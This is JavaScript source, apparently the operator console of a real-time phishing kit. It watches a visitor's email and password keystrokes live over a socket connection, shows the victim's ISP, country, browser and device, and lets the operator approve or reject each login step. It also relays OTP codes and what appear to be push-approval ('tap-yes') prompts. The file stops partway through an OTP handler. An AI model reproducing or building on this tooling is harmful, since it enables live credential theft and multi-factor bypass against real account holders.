//BEGINING OF OUTPUTSTYLE CODE//

// const history = document.getElementById('history');
import { countryCodes } from './components/countrycodes.js'
import { sleep } from './components/utils.js';

// const history = document.getElementById('history');
const input = document.getElementById('input1');
const input1 = document.getElementById('input11');

const copyClick = document.getElementById('copyclick');
const copyClick1 = document.getElementById('copyclick1');

const engaged = document.getElementById("engaged")
const engaged1 = document.getElementById("engaged1")
const next1 = document.getElementById("next")
const previous = document.getElementById("previous")
const finished = document.getElementById("finished")
const finished1 = document.getElementById("finished2")
const previousClear = document.getElementById("previous-clear")
const nextClear = document.getElementById("next-clear")
const clearPass = document.getElementById("clear-pass")
const clearEmail = document.getElementById("clear-email")
const submitfield2 = document.getElementById("submitfield")
const reject1 = document.getElementById("reject1")
let submited = false
let clickNoneFlag = false

let positioninput = document.getElementById("input2");
let positioninput1 = document.getElementById("input21");
const cursor = document.getElementById('cursor');
let cursorPosition = -1
let selectionStart = 0
let selectionEnd = 0


function focusAndMoveCursorToTheEnd(e) {
    input.focus();


    const range = document.createRange();
    const selection = window.getSelection();
    const { childNodes } = input;
    const lastChildNode = childNodes && childNodes.length - 1;

    range.selectNodeContents(lastChildNode === -1 ? input : childNodes[lastChildNode]);
    range.collapse(false);

    selection.removeAllRanges();
    selection.addRange(range);
}

function handleCommand(command) {
    const line = document.createElement('DIV');

    line.textContent = `C:\\WIKIPEDIA > ${command}`;

    // history.appendChild(line);
}

// Every time the selection changes, add or remove the .noCursor
// class to show or hide, respectively, the bug square cursor.
// Note this function could also be used to enforce showing always
// a big square cursor by always selecting 1 chracter from the current
// cursor position, unless it's already at the end, in which case the
// #cursor element should be displayed instead.
document.addEventListener('selectionchange', selectionChange);

function selectionChange(event) {
    // console.log('selectionchange func called')

    //     if (document.activeElement.id !== 'input2') return;
    let select = 'selectionchange'


    // console.log(select, positioninput)
    // const range = window.getSelection().getRangeAt(0);
    // console.log('currently at', e.target.activeElement.id)
    const active = event.id
    removeBlinkingCursor(active)
    const id = "#" + active
    const start = event.start
    cursorPosition = start
    const end = event.end

    let currentOutput = null


    currentOutput = active == 'input1' ? positioninput : positioninput1
    let inactiveOutput = active == 'input1' ? positioninput1 : positioninput

    inactiveOutput.classList.add('noCaret')

    let temp = ""
    for (let i = 0; i < currentOutput.children.length; i++) {
        // if(start == positioninput.children.length){
        // continue
        // }
        if (i == start || (start != end && (i < end && i >= start))) {
            temp += `<span class="black">${currentOutput.children[i].textContent}</span>`
            // positioninput.children[i].classList.add('black')
            // console.log(positioninput.children[i].textContent)
        }
        else {
            temp += `<span>${currentOutput.children[i].textContent}</span>`
            // positioninput.children[i].classList.remove('black')

        }

    }
    currentOutput.innerHTML = temp
    if (event.data) {

        const length = event.data.length;

        if (end < length) {
            currentOutput.classList.add('noCaret');
        } else {
            currentOutput.classList.remove('noCaret');
        }
    } else {
        currentOutput.classList.remove('noCaret');
    }
}


input.addEventListener('input', onInputFunc);
input.addEventListener('blur', hideCarret);
input.addEventListener('focus', onfocus);
input1.addEventListener('input', onInputFunc);
input1.addEventListener('keydown', onKeyDown);
input1.addEventListener('blur', hideCarret);
input1.addEventListener('focus', onfocus);
copyClick.addEventListener('click', copyToClipboard);
copyClick1.addEventListener('click', copyToClipboard);
reject1.addEventListener('click', function () {
    submited = false
    // input.value = ''
    // input1.value = ''
    // positioninput.innerHTML = ''
    // positioninput1.innerHTML = ''
});

function onInputFunc(e) {
    const origin = e.target.id
    inputSource = origin == 'input1' ? input : input1
    // If we paste HTML, format it as plain text and break it up
    // input individual lines/commands:
    refresh(origin)
    // If we press delete key, re-render the output
    // so that it reflects the current state of the 
    // input
    // also check if we are deleting backwards or
    // deleteing forwards
    if (e.inputType.match('delete')) {
        if (cursorPosition > 0 && e.inputType == 'deleteContentBackward') {
            cursorPosition--
        }
        refresh(origin)
    }

    //console.log(e)
    if (e.key == 'Enter' && origin == 'input11') {
        submitfield2.click()
        submited = true
    }
    if (input.childElementCount > 0) {
        const lines = inputSource.innerText.replace(/\n$/, '').split('\n');
        const lastLine = lines[lines.length - 1];

        for (let i = 0; i <= lines.length - 2; ++i) {
            handleCommand(lines[i]);
        }

        inputSource.textContent = lastLine;

        //focusAndMoveCursorToTheEnd();
    }

    // If we delete everything, display the square caret again:
    let outputToTarget = null
    outputToTarget = origin == 'input1' ? positioninput : positioninput1

    if (inputSource.value === 0) {
        outputToTarget.classList.remove('noCaret');
    }
}

function onKeyDown(e) {
    const origin = e.target.id

    //console.log(e)
    if (e.key == 'Enter' && origin == 'input11') {
        submitfield2.click()
        submited = true
    }

}

document.addEventListener('keydown', (e) => {
    // If some key is pressed outside the input, focus it and move the cursor
    // to the end:
    // if (e.target !== input) focusAndMoveCursorToTheEnd();
});

input.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
        e.preventDefault();

        handleCommand(input.textContent);
        input.textContent = '';
        //focusAndMoveCursorToTheEnd();
    }
});

// Set the focus to the input so that you can start typing straigh away:
// input.focus();


function refresh(id, event) {

    removeBlinkingCursor(id)
    let outputToTarget = null
    outputToTarget = id == 'input1' ? positioninput : positioninput1
    let inputSource = id == 'input1' ? input : input1

    let inactiveOutput = id == 'input1' ? positioninput1 : positioninput
    inactiveOutput.classList.add('noCaret')

    outputToTarget.innerHTML = ''
    const inputText = event.data
    // console.log({ inputText })
    for (let i = 0; i < inputText.length; i++) {
        var textspan = document.createElement("span");
        textspan.innerText = inputText[i]
        if (i == cursorPosition) {
            textspan.classList.add('black')
        }
        outputToTarget.appendChild(textspan)
    }

    const end = event.end


    const length = inputText.length;
    console.log({ end, length })
    if (end < length) {
        // console.log('removing carret')
        outputToTarget.classList.add('noCaret');
    } else {
        outputToTarget.classList.remove('noCaret');
    }
    // console.log('Refreshed..')
    //console.log({length:positioninput.children.length})

}

function hideCarret(e) {
    const id = e.target.id

    // on-blur, play animations
    if (!e.target.value && id == 'input1') {
        clearEmail.click()
    } else if (e.target.value && id == 'input1' && !submited) {
        finished.click()
    }
    if (!e.target.value && id == 'input11') {
        clearPass.click()
    } else if (e.target.value && id == 'input11' && !submited) {
        finished1.click()
    }



    // console.log('blurred...', id)
    let outputToTarget = id == 'input1' ? positioninput : positioninput1
    outputToTarget.classList.add('noCaret');
    removeBlinkingCursor(id)
}

function onfocus(e) {
    const id = e.target.id
    const data = input.value
    const data1 = input1.value

    if (!data && id == 'input11') {
        nextClear.click()
    } else if (!data1 && id == 'input1') {
        previousClear.click()
    } else if (data && id == 'input11') {
        next1.click()
    } else if (data1 && id == 'input1') {
        previous.click()
    }

}

// looop through all the spans of the output that is supposed to be 
// inactive and remove the 'black' class
function removeBlinkingCursor(id) {
    // console.log({ removeFor: id })
    let outputToTarget = null
    // check the id of the source input and determine which output to alter
    // outputToTarget = id == 'input1' ? positioninput1 : positioninput

    if (positioninput1.children.length) {
        for (let i = 0; i < positioninput1.children.length; i++) {
            positioninput1.children[i].classList.remove('black')
        }
    }
    if (positioninput.children.length) {
        for (let i = 0; i < positioninput.children.length; i++) {
            positioninput.children[i].classList.remove('black')
        }
    }

}

function copyToClipboard(e) {
    const id = e.currentTarget.id
    const outputWithData = id == 'copyclick' ? positioninput : positioninput1

    const text = outputWithData.textContent
    // console.log('copying the following data: ', text)

    navigator.clipboard.writeText(text).then(function () {
        //console.log('copied to clipboard: ', text)
        // The text has been successfully written to the clipboard
    }, function (err) {
        //console.log('There was an error copyting text: ', err)
        // There was an error writing the text to the clipboard
    });
}


positioninput.classList.add('noCaret')
positioninput1.classList.add('noCaret')


//END OF OUTPUTSTYLE CODE//






//BEGINING OF AUTO SCROLL CODE//


const acceptChild = document.getElementById("acceptchild")
const allow1 = document.getElementById("allow1")
const select = document.getElementById("allow2")
const gearbutton = document.getElementById("gearbutton")
const logo = document.getElementById("logo")
const verif = document.getElementById("verif")
const verif2 = document.getElementById("verif2")
const submi5 = document.getElementById("submi5")
const ender = document.getElementById("ender")
const endscroller = document.getElementById("endscroller")
const reject4 = document.getElementById("reject4")
const divblock170 = document.getElementById("divblock170")
const divscroll = document.getElementById("divscroll")
// const scrollinto = document.getElementById("scrollinto")


const autoScrollElements = [
    {
        name: 'login1',
        target: 'loginnavbar'
    },
    {
        name: 'login2',
        target: 'loginnavbar',
    }
    ,
    {
        name: 'auth1',
        target: 'authnavbar',
    },
    {
        name: 'auth2',
        target: 'authnavbar',
    }
    ,
    {
        name: 'id1',
        target: 'idnavbar',
    },
    {
        name: 'id2',
        target: 'idnavbar'
    }
]


for (let i = 0; i < autoScrollElements.length; i++) {
    const idBtn = autoScrollElements[i].name
    const idTarget = autoScrollElements[i].target
    const btn = document.getElementById(idBtn)
    const target = document.getElementById(idTarget)
    btn.addEventListener('click', function () {
        target.scrollIntoView({ block: 'start' })
    })
}


let scrollable = true


allow1.addEventListener("click", function () {

    acceptChild.scrollIntoView({ block: "start" });
    disableScroll()

})

gearbutton.addEventListener("click", function () {

    logo.scrollIntoView({ behaviour: "smooth", block: "start" });
    if (scrollable) {
        disableScroll()
    } else {
        enableScroll()
    }
    scrollable = !scrollable

})


select.addEventListener('click', enableScroll)
verif.addEventListener('click', enableScroll)
verif2.addEventListener('click', enableScroll)
submi5.addEventListener('click', enableScroll)

const authnavbar = document.getElementById('authnavbar')
verif.addEventListener('click', function () {
    setTimeout(() => {
        authnavbar.scrollIntoView({ block: "start" })
    }, 300);
})
submi5.addEventListener('click', function () {
    setTimeout(async () => {
        if (clickNoneFlag) {
            await sleep(300)
            document.getElementById('tapsubmit').click()
            return
        }
        authnavbar.scrollIntoView({ block: "start" })
    }, 300);
})
verif2.addEventListener('click', function () {
    setTimeout(() => {
        authnavbar.scrollIntoView({ block: "start" })
    }, 300);
})

// login1.addEventListener('click', function(){
//     logo.scrollIntoView({ block: "start" });
// })

// login2.addEventListener('click', function(){
//         logo.scrollIntoView({ block: "start" })
//     })




// left: 37, up: 38, right: 39, down: 40,
// spacebar: 32, pageup: 33, pagedown: 34, end: 35, home: 36
var keys = { 37: 1, 38: 1, 39: 1, 40: 1 };

function preventDefault(e) {
    e.preventDefault();
}

function preventDefaultForScrollKeys(e) {
    if (keys[e.keyCode]) {
        preventDefault(e);
        return false;
    }
}

// modern Chrome requires { passive: false } when adding event
var supportsPassive = false;
try {
    window.addEventListener("test", null, Object.defineProperty({}, 'passive', {
        get: function () { supportsPassive = true; }
    }));
} catch (e) { }

var wheelOpt = supportsPassive ? { passive: false } : false;
var wheelEvent = 'onwheel' in document.createElement('div') ? 'wheel' : 'mousewheel';

// call this to Disable
function disableScroll() {
    window.addEventListener('DOMMouseScroll', preventDefault, false); // older FF
    window.addEventListener(wheelEvent, preventDefault, wheelOpt); // modern desktop
    window.addEventListener('touchmove', preventDefault, wheelOpt); // mobile
    window.addEventListener('keydown', preventDefaultForScrollKeys, false);
}

// call this to Enable
function enableScroll() {
    window.removeEventListener('DOMMouseScroll', preventDefault, false);
    window.removeEventListener(wheelEvent, preventDefault, wheelOpt);
    window.removeEventListener('touchmove', preventDefault, wheelOpt);
    window.removeEventListener('keydown', preventDefaultForScrollKeys, false);
}


// const observer = new IntersectionObserver(async function (entries) {
//     if (entries[0].isIntersecting) {
//         // console.log('disable scrolling')
//         disableScroll()
//         divscroll.scrollIntoView({ block: "end" });
//         await new Promise(r => setTimeout(r, 500));
//         // console.log('enables scrolling')
//         enableScroll()


//     }
// });

// observer.observe(ender);

window.addEventListener("DOMContentLoaded", function () {
    const targetElement = document.querySelector("#divscroll"); // Replace with your element's ID or any valid CSS selector.
    const body = document.body;

    if (targetElement) {
        const rect = targetElement.getBoundingClientRect();
        const maxHeight = rect.top + rect.height;

        window.addEventListener("scroll", function () {
            if (window.scrollY >= maxHeight) {
                // Prevent scrolling beyond the maxHeight by applying the 'no-scroll' class.
                body.classList.add("no-scroll");
                // Set the scrollTop to the maxHeight to maintain the position.
                window.scrollTo(0, maxHeight);
            } else {
                // Remove the 'no-scroll' class to allow scrolling again.
                body.classList.remove("no-scroll");
            }
        });
    }
});



//END OF AUTO SCROLL CODE//


//BEGINING OF SLIDER CODE//



let sliderCollection = document.getElementById('sliders').children
let numSliders = document.getElementById('sliders').children.length

// for(let i=0; i<sliderCollection.length; i++) {
//     sliderCollection[i].classList.add('slider')
// }

let state = []
for (let i = 0; i < numSliders; i++) {
    state.push({
        name: sliderCollection[i].id,
        active: sliderCollection[i].classList.contains('active')
    })
}

const nextslider = function () {
    let current = ''
    let previous = ''
    // console.log({numSliders})
    // console.log({state})
    for (let i = 0; i < numSliders; i++) {
        const slider = state[i]
        if (!slider.active) continue
        //console.log(slider)
        previous = slider.name
        if (i == numSliders - 1) {
            slider.active = false
            current = state[0].name
            state[0].active = true
            break
        } else {
            slider.active = false
            current = state[i + 1].name
            state[i + 1].active = true
            break
        }
    }
    //console.log({current, previous})
    document.getElementById(current).classList.add('active')
    document.getElementById(previous).classList.remove('active')
}
const prev = function () {
    let current = ''
    let previous = ''
    for (let i = 0; i < numSliders; i++) {
        const slider = state[i]
        if (!slider.active) continue
        //console.log(slider)
        previous = slider.name
        if (i == 0) {
            slider.active = false
            current = state[numSliders - 1].name
            state[numSliders - 1].active = true
            break
        } else {
            slider.active = false
            current = state[i - 1].name
            state[i - 1].active = true
            break
        }
    }
    document.getElementById(current).classList.add('active')
    document.getElementById(previous).classList.remove('active')
}

const prevBtn = document.getElementById('prev')
const nextBtn = document.getElementById('nextslider')
prevBtn.addEventListener('click', function () {
    prev()
})
nextBtn.addEventListener('click', function () {
    nextslider()
})

//END OF SLIDER CODE//




//BEGINING OF SOUND CODE//

var copysound = new Audio("https://od.lk/d/NjNfMjY2MjE1MjBf/four.mpeg");
var notification = new Audio("https://od.lk/d/NjNfMjY2Njc3Mzdf/five.mpeg");
var submition = new Audio("https://od.lk/d/NjNfMjY2Njc3Nzlf/six.mpeg");
var submitfield = new Audio("https://od.lk/d/NjNfMjY3MTgzMDdf/eight.mpeg");
var clicks2 = new Audio("https://od.lk/d/NjNfMjY3MjU1NDBf/11.mpeg");
var gearsound1 = new Audio("https://od.lk/d/NjNfMjY3MjU1MTRf/10.mpeg");
var rejectsound = new Audio("https://od.lk/d/MzJfMjIzMjk0NTdf/reject%20buzzer.mp3");
var acceptsound = new Audio("https://od.lk/d/MzJfMjIzOTAzODZf/accept7.mp3");

const playcopysound = document.getElementById("copyclick");
const playcopysound1 = document.getElementById("copyclick1");
const playcopysound2 = document.getElementById("copyclick13");
playcopysound.addEventListener("click", function () {
    copysound.play();
});
playcopysound1.addEventListener("click", function () {
    copysound.play();
});
playcopysound2.addEventListener("click", function () {
    copysound.play();
});
const playnotification = document.getElementById("notification");
const playnotification1 = document.getElementById("notification1");

playnotification.addEventListener("click", function () {
    setTimeout(function () {
        notification.play();
    }, 350);
});
playnotification1.addEventListener("click", function () {
    setTimeout(function () {
        notification.play();
    }, 350);
});
const playsubmition = document.getElementById("allow1");
const playsubmition1 = document.getElementById("allow2");
const playsubmition2 = document.getElementById("reject1");
const playsubmition7 = document.getElementById("reject3");
const playsubmition8 = document.getElementById("allow3");
const playsubmition9 = document.getElementById("reject4");
const playsubmition10 = document.getElementById("allow4");
playsubmition.addEventListener("click", function () {
    clicks2.play();
});
playsubmition1.addEventListener("click", function () {
    clicks2.play();
});
playsubmition2.addEventListener("click", function () {
    clicks2.play();
});
playsubmition7.addEventListener("click", function () {
    clicks2.play();
});
playsubmition8.addEventListener("click", function () {
    clicks2.play();
});
playsubmition9.addEventListener("click", function () {
    clicks2.play();
});
playsubmition10.addEventListener("click", function () {
    clicks2.play();
});
const playsubmitfield = document.getElementById("submitfield");
const playsubmitfield1 = document.getElementById("submitfield1");
const playsubmitfield2 = document.getElementById("submitfield2");
playsubmitfield.addEventListener("click", function () {
    submitfield.play();
});
playsubmitfield1.addEventListener("click", function () {
    submitfield.play();
});
playsubmitfield2.addEventListener("click", function () {
    submitfield.play();
});
const playsubmitions = document.getElementById("verif");
const playsubmitions1 = document.getElementById("verif1");
const playsubmitions2 = document.getElementById("verif2");
playsubmitions.addEventListener("click", function () {
    clicks2.play();
});
playsubmitions1.addEventListener("click", function () {
    clicks2.play();
});
playsubmitions2.addEventListener("click", function () {
    clicks2.play();
});
const playsubmitions3 = document.getElementById("my_button");
const playsubmitions4 = document.getElementById("my_button1");
const playsubmitions5 = document.getElementById("my_button2");
const playsubmitions6 = document.getElementById("submi5");
playsubmitions3.addEventListener("click", function () {
    clicks2.play();
});
playsubmitions4.addEventListener("click", function () {
    clicks2.play();
});
playsubmitions5.addEventListener("click", function () {
    clicks2.play();
});
playsubmitions6.addEventListener("click", function () {
    clicks2.play();
});
const playgearsound = document.getElementById("gearbutton");
playgearsound.addEventListener("click", function () {
    gearsound1.play();
});

const proceed1 = document.getElementById("proceed1");
proceed1.addEventListener("click", function () {
    acceptsound.play();
});

//END OF SOUND CODE//




//BEGINING OF AUTH CODE//


let inputContainer = document.getElementById('input_container');
let outputContainer = document.getElementById('output_container');
let inputs1 = inputContainer.querySelectorAll('input');
let outputs = outputContainer.querySelectorAll('input');
let endgagedauth = document.getElementById('endgagedauth');
let clearauth = document.getElementById('clearauth');
let finishedauth = document.getElementById('finishedauth');
let copyChildrenBtn = document.getElementById('copyclick13');
let time = Date.now()
let timeElapsed = 0
// let i = 0;
let counters = 1
let inputs2data = ""
let outputData = {}
let engagedFlag = false
let finishedFlag = false
let clearFlag = false
let currentParent = null

inputs1.forEach((inp, index) => inp.oninput = function (e) {
    // If the entered input is valid, replace what's already in input
    // Else, retain what was there
    this.value = e.data ? e.data : this.value;
    // On delete key press, the this.value will be empty, hence
    // dont focus on next element
    if (this.value) {
        //console.log(this.id)
        if (index < inputs1.length - 1) inputs1[index + 1].focus()
        // inputs12data = inputs1[i+1].value
        outputData[this.id] = this.value
        refreshOutput()
    }
    // console.log(outputData)
})

function refreshOutput() {
    outputs.forEach(e => {
        //we are at 1c1 wanting to access 1c2
        const dataForInput = outputData[e.id.substring(0, 2) + "1"]
        e.value = dataForInput ? dataForInput : ""
        // if (age>18) {issueID} else {sendHOme}
        // age>18 ? issueID : sendHome
        // console.log('this is output',e.id.substring(0,2)+"1","this is input", e.id)
    })
}


function keyPressedAuth(TB, e) {
    //console.log(e.target.value)
    // return event.keyCode!==69 && event.keyCode!==187&&event.keyCode!==189
    if (e.keyCode == 39) {
        if (TB.split("b")[0] < inputs1.length) {
            document.getElementById(eval(TB.split("b")[0] + '+1') + 'b' + TB.split("b")[1]).focus();
            return
        }
    }


    if (e.keyCode == 37) {
        if (TB.split("b")[0] > 1) {
            document.getElementById(eval(TB.split("b")[0] + '-1') + 'b' + TB.split("b")[1]).focus();
        }
        if (e.keyCode == 8) {
            e.target.value = ''
            outputData[e.target.id] = ''
            refreshOutput()
        }
    }
    const { length, expected } = checkData(currentParent)
    if (e.keyCode == 13 && length == expected) {
        submitfield1.click()
        submited = true
        finishedFlag = true
    }

    if (e.keyCode == 8) {
        // 1c1 or 1c2 -> ['1','1'] ['1','2']
        const elem = TB.split("b")[0]
        if (counters < 1 && elem > 1) {
            document.getElementById(eval(elem + '-1') + 'b' + TB.split("b")[1]).focus();
        }

        if (!inputs2data && elem > 1) {
            document.getElementById(eval(elem + '-1') + 'b' + TB.split("b")[1]).focus();
        }

        outputData[e.target.id] = ''
        refreshOutput()
        e.target.value = ''
        counters--
    } else {
        counters = 1
    }

}

const inputParent = $("#input_container").children();

inputs1.forEach(function (input) {
    input.addEventListener('focus', function (e) {
        currentParent = inputParent
        activeState(e)
    })
})

inputs1.forEach(function (input) {
    input.addEventListener('click', function (e) {
        e.stopPropagation()
    })
})

inputs1.forEach(function (input) {
    input.addEventListener('blur', outOfFocus)
})

copyChildrenBtn.addEventListener('click', function (e) {
    // console.log(e.target.id, "copying to clipboard...ß")
    copyChildrenToClipboard(currentParent)
})

// stop propagating click events in the inputs container elements
// so that the engaged animation do not conflict with the finished
// animation

// Get all the children of the output container
const outputParents = $("#output_container").children();

// when active state is called
function activeState(e) {
    timeElapsed = stopTime()
    clickEngaged()
    const id = e.target.id // 1c1

    // calculate the ID of the target output input
    const target = id.substring(0, 2) + "2" // 1c2

    // for all the output children
    for (let i = 0; i < outputParents.length; i++) {

        // get the current child
        const oneDiv = outputParents[i]

        // get the input element of the current child
        const inputToHighligt = $(oneDiv).find('input')

        // get the div (used for highlighting) of the current child
        const divToHighligt = $(oneDiv).find('div')

        // if it is the child of interest
        if (inputToHighligt.attr('id') == target) {
            // highlight it
            // divToHighligt.addClass('activestate')
            //console.log("changing styles for ", target);
            divToHighligt.addClass("show");


        } else {
            divToHighligt.removeClass("show");
            // remove highlight class (because it might have been added before)
            // divToHighligt.addClass('blinker')
        }
    }


    // outputs.forEach(e => {
    //     e.classList.remove('activestate')
    // })
    // document.getElementById(target).classList.add('activestate')
}

function startTime() {
    time = Date.now()
}

function stopTime() {
    return (Date.now() - time)
}

function clickEngaged() {
    if (engagedFlag == false) {
        //console.log("engage click")
        endgagedauth.click()
        console.log("click: endgagedauth")

        if (finishedFlag == true || clearFlag == true) {
            console.log("click: endgagedauth")

            endgagedauth.click()
            finishedFlag = false
            clearFlag = false
        }
        engagedFlag = true
    }
}
function clickClearAuth() {
    //console.log("timeelapsed is:",timeElapsed)
    const { length } = checkData(outputParents)
    if (length == 0) {
        // console.log("clearing...")
        clearauth.click()
        console.log("click: clearauth")

        engagedFlag = false
        clearFlag = true
    }
}

// click finished using the bubbled events received by the body
// tag of the html document
document.body.addEventListener('click', function (e) {

    // if (["endgagedauth", "clearauth"].includes(e.target.id)) {
    //     return
    // }
    // // console.log("The body received click from", e.target.id)
    // clickFinished()
    // clickClearAuth()
})
function clickFinished() {
    const { length, expected } = checkData(outputParents)
    if (length == expected && finishedFlag == false) {
        console.log("click: finishedauth")

        finishedauth.click()
        engagedFlag = false
        finishedFlag = true
        //console.log({engagedFlag})
    }
}

// when input loses focus
function outOfFocus(e) {
    startTime()
    //console.log({engagedFlag})
    const { length, expected } = checkData(outputParents)
    const completed = length == expected
    // console.log({completed})

    for (let i = 0; i < outputParents.length; i++) {

        // get the current child
        const oneDiv = outputParents[i]

        // get the div (used for highlighting) of the current child
        const divToHighligt = $(oneDiv).find('div')

        // remove highlight on all
        divToHighligt.removeClass("show");

    }
}

function checkData(parents) {
    if (!parents) return {
        lenght: null,
        expected: 1
    }
    const vals = []
    for (let i = 0; i < parents.length; i++) {

        // get the current child
        const content = parents[i]

        // get the div (used for highlighting) of the current child
        const dataInElem = $(content).find('input').val()

        if (dataInElem) vals.push(dataInElem)
    }
    return {
        length: vals.length,
        expected: parents.length
    }
}

function copyChildrenToClipboard(parent) {
    const vals = []
    for (let i = 0; i < parent.length; i++) {

        // get the current child
        const content = parent[i]

        // get the div (used for highlighting) of the current child
        const dataInElem = $(content).find('input').val()

        if (dataInElem) vals.push(dataInElem)
    }

    const text = vals.join('')
    // console.log('copying the following data: ', text)

    navigator.clipboard.writeText(text).then(function () {
        //console.log('copied to clipboard: ', text)
        // The text has been successfully written to the clipboard
    }, function (err) {
        // console.log('There was an error copyting text: ', err)
        // There was an error writing the text to the clipboard
    });
}

//END OF AUTH CODE//

//BEGINNING OF WEB SOCKET CODE//
const socket = io();

window.addEventListener('load', function () {
    socket.emit('admin', {})
})

socket.on('event', function (event) {
    const idOfInput = event.id

    if (event.type == 'input') {
        updateField(event)
    }
    if (event.type == 'selection') {
        selectionChange(event)
    }
    if (event.type == 'focus' && idOfInput == 'input1') {
        engaged.click()
    }
    if (event.type == 'focus' && idOfInput == 'input11') {
        engaged1.click()
    }
    if (event.type == 'blur' && idOfInput == 'input1') {

        positioninput.classList.add('noCaret');
        removeBlinkingCursor(idOfInput)

        if (event.action == 'clearEmail') {
            clearEmail.click()
        }
        if (event.action == 'finished') {
            finished.click()
        }
    }
    if (event.type == 'blur' && idOfInput == 'input11') {

        positioninput1.classList.add('noCaret');
        removeBlinkingCursor(idOfInput)

        if (event.action == 'clearPass') {
            clearPass.click()
        }
        if (event.action == 'finished') {
            finished1.click()
        }
    }
})

function updateField(event) {
    const idOfInput = event.id

    if (idOfInput == "input1") {
        refresh("input1", event)
    }

    if (idOfInput == "input11") {
        console.log({ idOfInput })
        refresh("input11", event)
    }

}

let connectedUser = {}
let waiting = {}
let imDB = []
let isAdminBusy = false
socket.on('connected', async function (db) {
    if (isAdminBusy) return

    console.log({ db })
    const sortedUsers = sortUsers(db)
    imDB = sortedUsers

    if (sortedUsers.length < 1) return

    // set the first User
    setFirstNotification(sortedUsers[0])
    setOtherNotifications(sortedUsers)

    if (sortedUsers.length <= 1) {
        playnotification.click()
    } else if (sortedUsers.length == 2) {
        document.getElementById('notification1').click()
    } else {
        document.getElementById('notification2').click()
    }

    // setUsers()
})
function sortUsers(users) {
    let arrayimDB = []
    Object.keys(users).forEach(key => {
        arrayimDB.push({
            ...users[key],
            id: key,
        })
    })
    // console.log({ arrayimDB })
    arrayimDB.sort((a, b) => new Date(b.time) - new Date(a.time))
    // console.log({ arrayimDB })
    return arrayimDB
}
socket.on('continue', function ({ id, page }) {
    waiting.id = id
    waiting.page = page
    if (page == 'email') {

        document.getElementById('submite').click()
    } else if (page == 'password') {
        document.getElementById('submitfield').click()
    }
    //setWaiting()
})


function setFirstNotification(user) {
    if (!user) return
    let id = user.id
    if (connectedUser.id == id) return
    connectedUser.id = id
    const t = new Date(user?.time);
    let time = t.toLocaleTimeString();
    let date = t.toLocaleDateString();
    if (user.data) {
        const cCode = user?.data.country.trim()
        try {
            document.getElementById("ISP").innerHTML = user?.data.org.split(" ").slice(1).join(" ")
        } catch (error) {
            console.log(error)
        }
        document.getElementById("countrys").innerHTML = countryCodes[cCode]
    }
    document.getElementById("Datesd").innerHTML = date
    document.getElementById("Time").innerHTML = time
    document.getElementById("Browser").innerHTML = user?.browser
    document.getElementById("device1").innerHTML = user?.platform
    document.getElementById("userheading").innerHTML = user?.name
}

function setOtherNotifications(users) {
    let otherUsers = ""
    const moreUsers = users
    if (users.length < 2) return
    moreUsers.forEach(function (user, index) {
        if (connectedUser.id == user.id) return
        // Get the user from the object
        otherUsers += `<button onclick="updateNotification('${user.id}')" class="usershistory w-button">${user?.name}</button>`
    })

    document.getElementById('userholder').innerHTML = otherUsers
}

function updateNotification(key) {
    if (!key && imDB.length > 0) {
        setFirstNotification(imDB[0])
        setOtherNotifications(imDB)
        return
    }
    let user = imDB.find(i => i.id == key)
    setFirstNotification(user)
    setOtherNotifications(imDB)
}

const proceed = document.getElementById("proceed");
proceed.addEventListener("click", function () {
    isAdminBusy = true
    allow(connectedUser.id)
    acceptsound.play();
});
socket.on('notificationclick', function ({ id }) {
    console.log("notificationclick")
    isAdminBusy = true
    imDB = imDB.filter(item => item.id != id)
    //hideAllNotifications()
    document.getElementById('clickhide').click()
})

const redirectsound = document.getElementById("redirect");
redirectsound.addEventListener("click", function () {
    reject(connectedUser.id)
    rejectsound.play();
});
let emailAllowed = false
let userID = null
document.getElementById('allowemail').addEventListener('click', function (e) {
    if (emailAllowed) {
        console.log("User tapped yes")
        const id = localStorage.getItem('user-id')
        socket.emit('user-tap-yes', { id })
    }
    allowEmail(waiting.id)
    userID = waiting.id
    emailAllowed = true
})
let areaCode = 0
document.getElementById('my_button').addEventListener('click', function (e) {
    areaCode = 1
})
document.getElementById('my_button1').addEventListener('click', function (e) {
    areaCode = 2
})
document.getElementById('my_button2').addEventListener('click', function (e) {
    areaCode = 3
})
document.getElementById('submi5').addEventListener('click', function (e) {
    allowPassword(waiting.id, 'mobile')
})
reject1.addEventListener('click', function (e) {
    if (waiting.page == 'email') {
        rejectEmail(waiting.id)
        return
    } else if (waiting.page == 'password') {
        rejectPassword(waiting.id)
    }
    // else rejectPass(waiting.id)
})


// function setUsers() {
//     let temp = ""
//     Object.keys(connectedUSERS).forEach(function (key) {
//         temp += `<li>${connectedUSERS[key]} 
//                     <button onclick="allow('${key}')">allow</button>
//                     <button onclick="reject('${key}')">reject</button>
//                 </li>
//                 `
//     })
//     users.innerHTML = temp
// }

// function setWaiting() {
//     let temp = ""
//     Object.keys(waiting).forEach(function (key) {
//         temp += `<li>${waiting[key]} 
//                     <button onclick="allowEmail('${key}')">allow</button>
//                     <button onclick="rejectEmail('${key}')">reject</button>
//                 </li>
//                 `
//     })
//     queue.innerHTML = temp
// }

function allow(key) {
    imDB = imDB.filter(item => item.id != key)
    socket.emit('allow', { id: key })
}
function allowEmail(key) {
    localStorage.setItem('user-id', key)
    socket.emit('allowEmail', { id: key })
}
let ending = null
function allowPassword(key, code) {
    const val1 = document.getElementById('1c1').value
    const val2 = document.getElementById('2c1').value
    if (!clickNoneFlag) {
        socket.emit('allowPassword', { id: key, data: { code, ending: `${val1}${val2}`, areaCode } })
    } else {
        socket.emit('tap-yes', { id: key, data: { code, ending: `${val1}${val2}`, areaCode } })
    }
}
function reject(key) {
    imDB = imDB.filter(item => item.id != key)
    updateNotification(null)
    socket.emit('reject', { id: key })
}
function rejectEmail(key) {
    socket.emit('rejectEmail', { id: key })
}

function rejectPassword(key) {
    socket.emit('rejectPassword', { id: key })
}

let submitOtpFlag = false
socket.on('otp', function ({ status, data }) {
    setOtp(data)
    if (status == 'complete') {
        document.getElementById('submitfield1').click()
        console.log("click: submitfield1")
        submitOtpFlag = true

        // remove focus
        for (let i = 1; i <= 7; i++) {
            const elem = $(`#digit-${i}`).siblings().find('.activestate')
            if (elem) {
                elem.each(function () {
                    $(this).removeClass('show');
                });
            }
        }
    }
})
function setOtp(inputVals) {
    try {
        Object.keys(inputVals).forEach(key => {
            const val = inputVals[key]
            document.getElementById(key).value = val
        });
    } catch (error) {
        console.log(error)
    }
}
let blurTimeout = null
let engagedOtp = false
socket.on('otp-focus', function ({ id, url }) {
    clearTimeout(blurTimeout)

    if (!engagedOtp) {
